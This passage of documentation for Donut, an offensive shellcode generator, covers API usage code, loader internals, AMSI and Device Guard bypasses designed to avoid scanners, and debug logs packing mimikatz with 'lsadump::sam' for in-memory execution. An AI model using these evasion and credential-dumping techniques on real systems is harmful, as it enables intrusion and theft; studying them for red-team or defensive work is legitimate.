        _DonutDelete <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutDelete_t<span style='color:#808030; '>)</span>dlsym<span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutDelete</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        _DonutError  <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutError_t<span style='color:#808030; '>)</span> dlsym<span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutError</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        
        <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>_DonutCreate <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span> <span style='color:#808030; '>|</span><span style='color:#808030; '>|</span> _DonutDelete <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span> <span style='color:#808030; '>|</span><span style='color:#808030; '>|</span> _DonutError <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
          <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Unable to resolve Donut API.</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
          <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
        <span style='color:#800080; '>}</span>
      <span style='color:#800080; '>}</span> <span style='color:#800000; font-weight:bold; '>else</span> <span style='color:#800080; '>{</span>
        <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Unable to load donut.so.</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>endif</span>
  
    <span style='color:#603000; '>memset</span><span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>sizeof</span><span style='color:#808030; '>(</span>c<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// copy input file</span>
    <span style='color:#400000; '>lstrcpyn</span><span style='color:#808030; '>(</span>c<span style='color:#808030; '>.</span>input<span style='color:#808030; '>,</span> argv<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span><span style='color:#808030; '>,</span> DONUT_MAX_NAME<span style='color:#808030; '>-</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// default settings</span>
    c<span style='color:#808030; '>.</span>inst_type <span style='color:#808030; '>=</span> DONUT_INSTANCE_EMBED<span style='color:#800080; '>;</span>   <span style='color:#696969; '>// file is embedded</span>
    c<span style='color:#808030; '>.</span>arch      <span style='color:#808030; '>=</span> DONUT_ARCH_X84<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// dual-mode (x86+amd64)</span>
    c<span style='color:#808030; '>.</span>bypass    <span style='color:#808030; '>=</span> DONUT_BYPASS_CONTINUE<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// continues loading even if disabling AMSI/WLDP fails</span>
    c<span style='color:#808030; '>.</span>format    <span style='color:#808030; '>=</span> DONUT_FORMAT_BINARY<span style='color:#800080; '>;</span>    <span style='color:#696969; '>// default output format</span>
    c<span style='color:#808030; '>.</span>compress  <span style='color:#808030; '>=</span> DONUT_COMPRESS_NONE<span style='color:#800080; '>;</span>    <span style='color:#696969; '>// compression is disabled by default</span>
    c<span style='color:#808030; '>.</span>entropy   <span style='color:#808030; '>=</span> DONUT_ENTROPY_DEFAULT<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// enable random names + symmetric encryption by default</span>
    c<span style='color:#808030; '>.</span>exit_opt  <span style='color:#808030; '>=</span> DONUT_OPT_EXIT_THREAD<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// default behaviour is to exit the thread</span>
    c<span style='color:#808030; '>.</span>thread    <span style='color:#808030; '>=</span> <span style='color:#008c00; '>1</span><span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// run entrypoint as a thread</span>
    c<span style='color:#808030; '>.</span>unicode   <span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// command line will not be converted to unicode for unmanaged DLL function</span>
    
    <span style='color:#696969; '>// generate the shellcode</span>
    err <span style='color:#808030; '>=</span> _DonutCreate<span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>err <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> DONUT_ERROR_SUCCESS<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Error : </span><span style='color:#007997; '>%s</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> _DonutError<span style='color:#808030; '>(</span>err<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span> 
    
    <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ loader saved to </span><span style='color:#007997; '>%s</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> c<span style='color:#808030; '>.</span>output<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    _DonutDelete<span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h2>Internals</h2>

<p>Everything that follows concerns internal workings of Donut and is not required knowledge to generate the shellcode/loader.</p>

<h2 id="instance">Donut Instance</h2>

<p>The position-independent code will always contain an <var>Instance</var> which can be viewed simply as a configuration for the code itself. It will contain all the data that would normally be stored on the stack or in the <code>.data</code> and <code>.rodata</code> sections of an executable. Once the main code executes, if encryption is enabled, it will decrypt the data before attempting to resolve the address of API functions. If successful, it will check if an executable file is embedded or must be downloaded from a remote staging server. To verify successful decryption of a module, a randomly generated string stored in the <code>sig</code> field is hashed using <var>Maru</var> and compared with the value of <code>mac</code>. The data will be decompressed if required and only then is it loaded into memory for execution.</p>

<h2 id="module">Donut Module</h2>

<p>Modules can be embedded in an <var>Instance</var> or stored on a remote HTTP server.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_MODULE <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      type<span style='color:#800080; '>;</span>                            <span style='color:#696969; '>// EXE/DLL/JS/VBS</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      thread<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// run entrypoint of unmanaged EXE as a thread</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      compress<span style='color:#800080; '>;</span>                        <span style='color:#696969; '>// indicates engine used for compression</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span>     runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>         <span style='color:#696969; '>// runtime version for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>          <span style='color:#696969; '>// domain name to use for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>             <span style='color:#696969; '>// name of class and optional namespace for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>          <span style='color:#696969; '>// name of method to invoke for .NET DLL or api for unmanaged DLL</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span>     param<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>           <span style='color:#696969; '>// string parameters for both managed and unmanaged DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      unicode<span style='color:#800080; '>;</span>                         <span style='color:#696969; '>// convert param to unicode before passing to DLL function</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span>     sig<span style='color:#808030; '>[</span>DONUT_SIG_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>              <span style='color:#696969; '>// string to verify decryption</span>
    uint64_t mac<span style='color:#800080; '>;</span>                             <span style='color:#696969; '>// hash of sig, to verify decryption was ok</span>
    
    uint32_t zlen<span style='color:#800080; '>;</span>                            <span style='color:#696969; '>// compressed size of EXE/DLL/JS/VBS file</span>
    uint32_t len<span style='color:#800080; '>;</span>                             <span style='color:#696969; '>// real size of EXE/DLL/JS/VBS file</span>
    uint8_t  data<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                         <span style='color:#696969; '>// data of EXE/DLL/JS/VBS file</span>
<span style='color:#800080; '>}</span> DONUT_MODULE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_MODULE<span style='color:#800080; '>;</span>
</pre>

<h2 id="hashing">Win32 API Hashing</h2>

<p>A hash function called <a href="https://github.com/odzhan/maru">Maru</a> is used to resolve the address of API at runtime. It uses a Davies-Meyer construction and the <a href="https://tinycrypt.wordpress.com/2017/01/11/asmcodes-speck/">SPECK</a> block cipher to derive a 64-bit hash from an API string. The padding is similar to what's used by MD4 and MD5 except only 32-bits of the string length are stored in the buffer instead of 64-bits. An initial value (IV) chosen randomly ensures the 64-bit API hashes are unique for each instance and cannot be used for detection of Donut. Future releases will likely support alternative methods of resolving address of API to decrease chance of detection.</p>

<h2 id="encryption">Symmetric Encryption</h2>

<p>The following structure is used to hold a master key, counter and nonce for Donut, which are generated randomly.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CRYPT <span style='color:#800080; '>{</span>
    <span style='color:#603000; '>BYTE</span>    mk<span style='color:#808030; '>[</span>DONUT_KEY_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// master key</span>
    <span style='color:#603000; '>BYTE</span>    ctr<span style='color:#808030; '>[</span>DONUT_BLK_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// counter + nonce</span>
<span style='color:#800080; '>}</span> DONUT_CRYPT<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CRYPT<span style='color:#800080; '>;</span>
</pre>

<p><a href="https://tinycrypt.wordpress.com/2017/02/20/asmcodes-chaskey-cipher/">Chaskey</a>, a 128-bit block cipher with support for 128-bit keys, is used in Counter (CTR) mode to decrypt a <var>Module</var> or an <var>Instance</var> at runtime. If an adversary discovers a staging server, it should not be feasible for them to decrypt a donut module without the key which is stored in the donut loader. Future releases will support downloading a key via DNS and also asymmetric encryption.</p>

<h2 id="bypasses">Bypasses</h2>

<p>Donut includes a bypass system for AMSI and other security features. Currently we bypass:</p>

<ul>
  <li>AMSI in .NET v4.8</li>
  <li>Device Guard policy preventing dynamically generated code from executing</li>
</ul>

<p>You may customize our bypasses or add your own. The bypass logic is defined in loader/bypass.c. Each bypass implements the DisableAMSI fuction with the signature ```BOOL DisableAMSI(PDONUT_INSTANCE inst)```, and comes with a corresponding preprocessor directive. We have several ```#if defined``` blocks that check for definitions. Each block implements the same bypass function. For instance, our first bypass is called ```BYPASS_AMSI_A```. If donut is built with that variable defined, then that bypass will be used.</p>

<p>Why do it this way? Because it means that only the bypass you are using is built into loader.exe. As a result, the others are not included in your shellcode. This reduces the size and complexity of your shellcode, adds modularity to the design, and ensures that scanners cannot find suspicious blocks in your shellcode that you are not actually using.</p>

<p>Another benefit of this design is that you may write your own AMSI bypass. To build Donut with your new bypass, use an ```if defined``` block for your bypass and modify the makefile to add an option that builds with the name of your bypass defined.</p>

<p>If you wanted to, you could extend our bypass system to add in other pre-execution logic that runs before your .NET Assembly is loaded.</p>

<h2 id="debug">Debugging The Loader</h2>

<p>The loader is capable of displaying detailed information about each step of file execution and can be useful in tracking down bugs. To build a debug-enabled executable, specify the debug label with nmake/make.</p>

<pre>
nmake debug -f Makefile.msvc
make debug -f Makefile.mingw
</pre>

<p>Use donut to create a shellcode as you normally would and a file called <code>instance</code> will be saved to disk.</p> 

<pre>
C:\hub\donut>donut mimikatz.exe -t -z5 -p"lsadump::sam exit"

  [ Donut shellcode generator v0.9.3
  [ Copyright (c) 2019 TheWover, Odzhan

DEBUG: donut.c:964:DonutCreate(): Entering.
DEBUG: donut.c:966:DonutCreate(): Validating configuration and path of file PDONUT_CONFIG: 000000BAC732EE30
DEBUG: donut.c:982:DonutCreate(): Validating instance type 1
DEBUG: donut.c:990:DonutCreate(): Validating format
DEBUG: donut.c:995:DonutCreate(): Validating compression
DEBUG: donut.c:1005:DonutCreate(): Validating entropy level
DEBUG: donut.c:1045:DonutCreate(): Validating architecture
DEBUG: donut.c:1055:DonutCreate(): Validating AMSI/WDLP bypass option
DEBUG: donut.c:311:get_file_info(): Entering.
DEBUG: donut.c:320:get_file_info(): Checking extension of mimikatz.exe
DEBUG: donut.c:327:get_file_info(): Extension is ".exe"
DEBUG: donut.c:343:get_file_info(): Module is EXE
DEBUG: donut.c:355:get_file_info(): Mapping mimikatz.exe into memory
DEBUG: donut.c:238:map_file(): Reading size of file : mimikatz.exe
DEBUG: donut.c:247:map_file(): Opening mimikatz.exe
DEBUG: donut.c:257:map_file(): Mapping 1013912 bytes for mimikatz.exe
DEBUG: donut.c:364:get_file_info(): Checking DOS header
DEBUG: donut.c:370:get_file_info(): Checking NT header
DEBUG: donut.c:376:get_file_info(): Checking IMAGE_DATA_DIRECTORY
DEBUG: donut.c:384:get_file_info(): Checking characteristics
DEBUG: donut.c:464:get_file_info(): Reading fragment and workspace size
DEBUG: donut.c:470:get_file_info(): workspace size : 1415999 | fragment size : 5161
DEBUG: donut.c:473:get_file_info(): Allocating memory for compressed file
DEBUG: donut.c:478:get_file_info(): Compressing with RtlCompressBuffer(XPRESS HUFFMAN)
DEBUG: donut.c:517:get_file_info(): Original file size : 1013912 | Compressed : 478726
DEBUG: donut.c:519:get_file_info(): File size reduced by 53%
DEBUG: donut.c:525:get_file_info(): Leaving.
DEBUG: donut.c:1076:DonutCreate(): Validating architecture 3 for DLL/EXE 2
DEBUG: donut.c:1116:DonutCreate(): Creating module
DEBUG: donut.c:635:CreateModule(): Entering.
DEBUG: donut.c:642:CreateModule(): Allocating 480054 bytes of memory for DONUT_MODULE
DEBUG: donut.c:718:CreateModule(): Setting the length of module data
DEBUG: donut.c:722:CreateModule(): Copying data
DEBUG: donut.c:735:CreateModule(): Leaving.
DEBUG: donut.c:1123:DonutCreate(): Creating instance
DEBUG: donut.c:746:CreateInstance(): Entering.
DEBUG: donut.c:749:CreateInstance(): Allocating space for instance
DEBUG: donut.c:756:CreateInstance(): The size of module is 480054 bytes. Adding to size of instance.
DEBUG: donut.c:759:CreateInstance(): Total length of instance : 483718
DEBUG: donut.c:771:CreateInstance(): Generating random key for instance
DEBUG: donut.c:777:CreateInstance(): Generating random key for module
DEBUG: donut.c:783:CreateInstance(): Generating random string to verify decryption
DEBUG: donut.c:788:CreateInstance(): Generating random IV for Maru hash
DEBUG: donut.c:794:CreateInstance(): Generating hashes for API using IV: 7F9CFD9E98CBBB71
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : LoadLibraryA           = 17355E8CFA7D19F2
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : GetProcAddress         = 8D3EBD1F34620889
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : GetModuleHandleA       = 5DB887782EF6CC37
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : VirtualAlloc           = BA9B4C4A6BEAF5EF
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : VirtualFree            = 9700D01C19AC3327
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : VirtualQuery           = F2A1D8F41B01A888
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : VirtualProtect         = 1B450EB228D7F4BF
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : Sleep                  = 309970892D16AE74
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : MultiByteToWideChar    = 28B0786855D4E4B7
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : GetUserDefaultLCID     = E2B11DFE6C1C9927
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : WaitForSingleObject    = 8E141DFA9123829C
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : CreateThread           = F619939835534A4E
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : GetThreadContext       = FF49CD4A23FC1A0A
DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : GetCurrentThread       = AFA0448721F19A48
DEBUG: donut.c:807:CreateInstance(): Hash for shell32.dll     : CommandLineToArgvW     = B9E1AB2F97AF3B82
DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreate        = 406E7F09F977003D
DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreateVector  = 90B641A7C06422B9
DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayPutElement    = CDAA1210672A291B
DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayDestroy       = DED07BF2F84740D5
DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetLBound     = 485237864F7642D7
DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetUBound     = 0B27A1EACACB8D54
DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SysAllocString         = E2851380598F923E
DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SysFreeString          = 9710625B79B7C59E
DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : LoadTypeLib            = 407E9567DBC5BC9C
DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetCrackUrlA      = A1D4A6736A0EA4AF
DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetOpenA          = C352FF2B2BB587A8
DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetConnectA       = 92DB8FB2A2686001
DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetSetOptionA     = 1DF489531305E2F2
DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetReadFile       = BFBAFCB31E63825B
DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetCloseHandle    = 4B18A02CC85D989E
DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : HttpOpenRequestA       = 160264D62A4DF1E2
DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : HttpSendRequestA       = 5936CF89C3F15FC8
DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : HttpQueryInfoA         = D4EEE57F477FE013
DEBUG: donut.c:807:CreateInstance(): Hash for mscoree.dll     : CorBindToRuntime       = 45964B3A0790EA11
DEBUG: donut.c:807:CreateInstance(): Hash for mscoree.dll     : CLRCreateInstance      = AF19DE2DFDDC387C
DEBUG: donut.c:807:CreateInstance(): Hash for ole32.dll       : CoInitializeEx         = 3C74435194201CEE
DEBUG: donut.c:807:CreateInstance(): Hash for ole32.dll       : CoCreateInstance       = AE07674E99604398
DEBUG: donut.c:807:CreateInstance(): Hash for ole32.dll       : CoUninitialize         = 2CBC3DC7C51672C0
DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlEqualUnicodeString  = 1BE848F01092C568
DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlEqualString         = 843A12A6D6B48A52
DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlUnicodeStringToAnsiString = 14183300DEDE2A3A
DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlInitUnicodeString   = 2AA1F15AC21C5EFD
DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlExitUserThread      = FAC1A2D55C0211EE
DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlExitUserProcess     = 112E064D1CFB5E87
DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlCreateUnicodeString = E59AF311C726FCC9
DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlGetCompressionWorkSpaceSize = 2691D357A2E502D8
DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlDecompressBufferEx  = 66845AB3DD7E5961
DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : NtContinue             = FFBE44BEFC842282
DEBUG: donut.c:933:CreateInstance(): Copying module data to instance
DEBUG: donut.c:938:CreateInstance(): encrypting instance
DEBUG: donut.c:950:CreateInstance(): Leaving.
DEBUG: donut.c:1131:DonutCreate(): Saving instance to file
DEBUG: donut.c:1164:DonutCreate(): PIC size : 504055
DEBUG: donut.c:1171:DonutCreate(): Inserting opcodes
DEBUG: donut.c:1207:DonutCreate(): Copying 20305 bytes of x86 + amd64 shellcode
DEBUG: donut.c:1267:DonutCreate(): Saving loader as raw data
DEBUG: donut.c:276:unmap_file(): Releasing compressed data
DEBUG: donut.c:280:unmap_file(): Unmapping
DEBUG: donut.c:283:unmap_file(): Closing
DEBUG: donut.c:1306:DonutCreate(): Leaving.
  [ Instance type : Embedded
  [ Module file   : "mimikatz.exe"
  [ Entropy       : Random names + Encryption
  [ Compressed    : Xpress Huffman (Reduced by 53%)
  [ File type     : EXE
  [ Parameters    : lsadump::sam exit
  [ Target CPU    : x86+amd64
  [ AMSI/WDLP     : continue
  [ Shellcode     : "loader.bin"
DEBUG: donut.c:1314:DonutDelete(): Entering.
DEBUG: donut.c:1333:DonutDelete(): Leaving.
</pre>

<p>Pass the instance as a parameter to loader32.exe or loader64.exe (depending on the module) and it will run on the host system as if in a target environment.</p>

<pre>
C:\hub\donut\>loader64 instance
Running...
DEBUG: loader.c:109:MainProc(): Maru IV : F0B0F2EDFF5B0A90
DEBUG: loader.c:112:MainProc(): Resolving address for VirtualAlloc() : D75920F405CAE1A
DEBUG: loader.c:116:MainProc(): Resolving address for VirtualFree() : D9181C14D8267BF1
DEBUG: loader.c:120:MainProc(): Resolving address for RtlExitUserProcess() : BBA9D25D742FFFBA
DEBUG: loader.c:129:MainProc(): VirtualAlloc : 00007FFF7599A190 VirtualFree : 00007FFF7599A180
DEBUG: loader.c:131:MainProc(): Allocating 483718 bytes of RW memory
DEBUG: loader.c:143:MainProc(): Copying 483718 bytes of data to memory 0000018F047B0000
DEBUG: loader.c:147:MainProc(): Zero initializing PDONUT_ASSEMBLY
DEBUG: loader.c:156:MainProc(): Decrypting 483718 bytes of instance
DEBUG: loader.c:163:MainProc(): Generating hash to verify decryption
DEBUG: loader.c:165:MainProc(): Instance : C5B56D70E7049030 | Result : C5B56D70E7049030
DEBUG: loader.c:172:MainProc(): Resolving LoadLibraryA
DEBUG: loader.c:189:MainProc(): Loading ole32
DEBUG: loader.c:189:MainProc(): Loading oleaut32
DEBUG: loader.c:189:MainProc(): Loading wininet
DEBUG: loader.c:189:MainProc(): Loading mscoree
DEBUG: loader.c:189:MainProc(): Loading shell32
DEBUG: loader.c:189:MainProc(): Loading dnsapi
DEBUG: loader.c:193:MainProc(): Resolving 48 API
DEBUG: loader.c:196:MainProc(): Resolving API address for 0819C096077AD66C
DEBUG: loader.c:196:MainProc(): Resolving API address for DB38502679800297
DEBUG: loader.c:196:MainProc(): Resolving API address for 0D75920F405CAE1A
DEBUG: loader.c:196:MainProc(): Resolving API address for D9181C14D8267BF1
DEBUG: loader.c:196:MainProc(): Resolving API address for 834C79B7969EDA8C
DEBUG: loader.c:196:MainProc(): Resolving API address for EF0BA1BAD577692E
DEBUG: loader.c:196:MainProc(): Resolving API address for 5835BC10745C1F7C
DEBUG: loader.c:196:MainProc(): Resolving API address for 7333599008177E49
DEBUG: loader.c:196:MainProc(): Resolving API address for 2868CEA85AAE96D6
DEBUG: loader.c:196:MainProc(): Resolving API address for 224C5EA75166A509
DEBUG: loader.c:196:MainProc(): Resolving API address for EBC25867667797AA
DEBUG: loader.c:196:MainProc(): Resolving API address for 29046C83F75992CD
DEBUG: loader.c:196:MainProc(): Resolving API address for 2D0266D6BCF829CB
DEBUG: loader.c:196:MainProc(): Resolving API address for D6E6294A0A1541B4
DEBUG: loader.c:196:MainProc(): Resolving API address for C66DECBF4383BCB2
DEBUG: loader.c:196:MainProc(): Resolving API address for 2D734066297BBBE2
DEBUG: loader.c:196:MainProc(): Resolving API address for 2A747549DA298E3D
DEBUG: loader.c:196:MainProc(): Resolving API address for B5C796A33B10E407
DEBUG: loader.c:196:MainProc(): Resolving API address for BC66A2B524CB0AE5
DEBUG: loader.c:196:MainProc(): Resolving API address for F83CE6DD874644B4
DEBUG: loader.c:196:MainProc(): Resolving API address for 1A51637CDB6FF143
DEBUG: loader.c:196:MainProc(): Resolving API address for 8D8BBF0E36AF8C09
DEBUG: loader.c:196:MainProc(): Resolving API address for B639F71AA8455E4D
DEBUG: loader.c:196:MainProc(): Resolving API address for E27E1946D5913519
DEBUG: loader.c:196:MainProc(): Resolving API address for 3C2B12AB58F87C74
DEBUG: loader.c:196:MainProc(): Resolving API address for 35D897120CB371FF
DEBUG: loader.c:196:MainProc(): Resolving API address for B397793CB6D5C517
DEBUG: loader.c:196:MainProc(): Resolving API address for 06D445864AEE48BA
DEBUG: loader.c:196:MainProc(): Resolving API address for F1AA68CD2B50BC01
DEBUG: loader.c:196:MainProc(): Resolving API address for 38EFCB47B85EA4D5
DEBUG: loader.c:196:MainProc(): Resolving API address for C24F502A68666494
DEBUG: loader.c:196:MainProc(): Resolving API address for BBB1AAE646EE2F7D
DEBUG: loader.c:196:MainProc(): Resolving API address for F6F19D9093F0C903
DEBUG: loader.c:196:MainProc(): Resolving API address for 269C41D7AE739078
DEBUG: loader.c:196:MainProc(): Resolving API address for C4C542975A41C8D7
DEBUG: peb.c:87:FindExport(): c4c542975a41c8d7 is forwarded to api-ms-win-core-com-l1-1-0.CoInitializeEx
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoInitializeEx)
DEBUG: loader.c:196:MainProc(): Resolving API address for 634BFF72C9EC1652
DEBUG: peb.c:87:FindExport(): 634bff72c9ec1652 is forwarded to api-ms-win-core-com-l1-1-0.CoCreateInstance
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoCreateInstance)
DEBUG: loader.c:196:MainProc(): Resolving API address for 3E82DCFC01A0E510
DEBUG: peb.c:87:FindExport(): 3e82dcfc01a0e510 is forwarded to api-ms-win-core-com-l1-1-0.CoUninitialize
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoUninitialize)
DEBUG: loader.c:196:MainProc(): Resolving API address for CC36148EA324FE24
DEBUG: loader.c:196:MainProc(): Resolving API address for 9817759202F29F6F
DEBUG: loader.c:196:MainProc(): Resolving API address for B6F6C364E469845C
DEBUG: loader.c:196:MainProc(): Resolving API address for DA51C8C9A172949A
DEBUG: loader.c:196:MainProc(): Resolving API address for E12D5E33742A1ED0
DEBUG: loader.c:196:MainProc(): Resolving API address for BBA9D25D742FFFBA
DEBUG: loader.c:196:MainProc(): Resolving API address for DC6DC4EA65052019
DEBUG: loader.c:196:MainProc(): Resolving API address for C8C7BFC1E7BC9A4B
DEBUG: loader.c:196:MainProc(): Resolving API address for 44E1E1404E099395
DEBUG: loader.c:196:MainProc(): Resolving API address for 611D823ADCDB9F62
DEBUG: loader.c:218:MainProc(): Module is embedded.
DEBUG: bypass.c:112:DisableAMSI(): Length of AmsiScanBufferStub is 36 bytes.
